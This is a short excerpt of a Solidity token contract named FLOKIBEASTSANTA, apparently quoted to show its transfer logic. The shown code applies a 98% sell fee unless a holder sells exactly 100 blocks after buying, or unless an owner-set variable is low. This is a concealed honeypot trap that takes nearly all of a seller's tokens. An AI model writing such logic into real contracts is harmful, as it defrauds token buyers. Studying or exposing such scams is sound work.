...
contract Flokibeastsanta is ERC20, Ownable {
    ...
    constructor() ERC20("FLOKIBEASTSANTA", "FBS")  {
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair|| from == pancakeswapRouterAddr) {
            if (cd[to] == 0) {
                cd[to] = block.number;
            }
        }
        ...
        if (!ef[to] && !ef[from]) {
            ...
            if (to == uniswapV2Pair || to == pancakeswapRouterAddr) {
                if (block.number.sub(cd[from]) == 100 || setFee < 50) {
                    total_fee = _sellFee;
                } else {
                    total_fee = 98;
                }
            } else if (from == uniswapV2Pair|| from == pancakeswapRouterAddr) {
                total_fee = buyFee;
            }
